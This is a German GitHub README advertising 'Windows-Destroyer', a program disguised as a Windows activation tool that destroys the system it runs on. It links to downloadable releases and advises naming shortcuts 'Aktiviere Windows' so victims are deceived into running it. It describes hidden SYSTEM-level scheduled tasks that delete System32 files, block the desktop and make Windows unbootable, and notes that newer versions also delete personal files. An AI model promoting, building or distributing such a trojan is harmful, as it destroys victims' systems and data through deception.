# Windows-Aktivierung-Tool
Ein Programm was sich als Aktivierung Tool ausgibt, um ein System komplett zu zerstören

# Wie funktionierts?
In der [Releases](https://github.com/MarcBeast/Windows-Destroyer/releases) page kannst du die neuste Version als .exe herunterladen
Diese .exe wurde mit dem Windows iexpress Tool erstellt und entpackt den Windows destroyer.

Nun kannst du die "Run Me!" Datei ausführen, diese kannst du auch beliebig umbenennen oder Verknüpfungen zu ihr erstellen getarnt als "Aktiviere Windows" oder ähnliches auf dem Desktop, sie darf jedoch nicht verschoben oder kopiert werden, es dürfen jedoch keine anderen Dateien umbenannt oder gelöscht werden.

# Was wird passieren?
Sobald die "Run Me!" Datei ausgeführt wurde und der UAC als Admin bestätigt wurde, wurden schon einige wichtige Dateien erstellt, wenn man in der Engine angelangt ist und zur "Initialisierung" kommt werden aufgaben erstellt für Windows die beim Systemstart oder beim Anmelden eines Benutzers aktiviert werden. Diese Aufgaben öffnen .bat Dateien mit System rechten was heißt, es ist unsichtbar und kann nicht aufgehalten werden, dabei werden wichtige Dateien in System32 gelöscht was Windows nicht mehr booten lässt, was einem am meisten auffallen wird ist das Explorer.exe nicht mehr ausgeführt werden kann - heißt keine Benutzeroberfläche mehr außer ein Ständiges Pop-up mit: "Dieser PC kann nicht mehr verwendet werden". Wird der PC nun neu gestartet, kann er nicht mehr booten.

# Kann man den PC retten?
Windows selber kann sich nicht mehr reparieren, was heißt das man die Festplatte an einen anderen PC Anhängen müsste um seine Dateien zu sichern.
Windows muss dann neu installiert werden. Andere Festplatten werden von dem Tool nicht betroffen

## Wichtig
Ab [v.2.8](https://github.com/MarcBeast/Windows-Destroyer/releases/tag/v.2.8) und darüber wird versucht Persönliche Dateien zu löschen, wenn das nicht das Ziel ist verwende [v.2.7](https://github.com/MarcBeast/Windows-Destroyer/releases/tag/v.2.7)
